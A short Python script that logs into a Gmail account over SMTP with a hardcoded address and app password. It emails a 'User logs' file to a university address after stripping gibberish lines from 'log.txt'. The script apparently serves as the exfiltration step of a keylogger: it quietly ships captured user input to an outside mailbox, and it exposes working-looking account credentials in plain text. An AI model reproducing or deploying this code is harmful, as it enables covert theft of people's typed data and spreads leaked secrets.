import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import gibberishclassifier
import string
import re


def sendMail():
    email = 'bkaplan10001@gmail.com'
    receiver_email = 'baltinyollar18@ku.edu.tr'
    random_password = 'cvvbsgxqkuziqgsd'
    protocol = 'smtp.gmail.com'
    smt = smtplib.SMTP(protocol, 587) #set protocol
    smt.ehlo()
    smt.starttls() #transport  layer security protocol setting
    smt.login(email, random_password) #loging to the account

    msg = MIMEMultipart()
    msg['From'] = email
    msg['To'] = receiver_email
    msg['Subject'] = "User logs"
    removeGiberrish()
    # Add the attachment to the message
    part = MIMEBase('application', "octet-stream")
    part.set_payload(open("gibberish_removed.txt", "rb").read())
    encoders.encode_base64(part)
    part.add_header('Content-Disposition', 'attachment', filename="gibberish_removed.txt")
    msg.attach(part)

    smt.sendmail(email, receiver_email, msg.as_string())
    smt.quit()

def removeGiberrish():
    with open("log.txt", "r") as file:
        lines = file.readlines()
        with open("gibberish_removed.txt", "w") as out_file:
            for line in lines:
                if(gibberishclassifier.classify(line) < 60):
                    out_file.write(line)



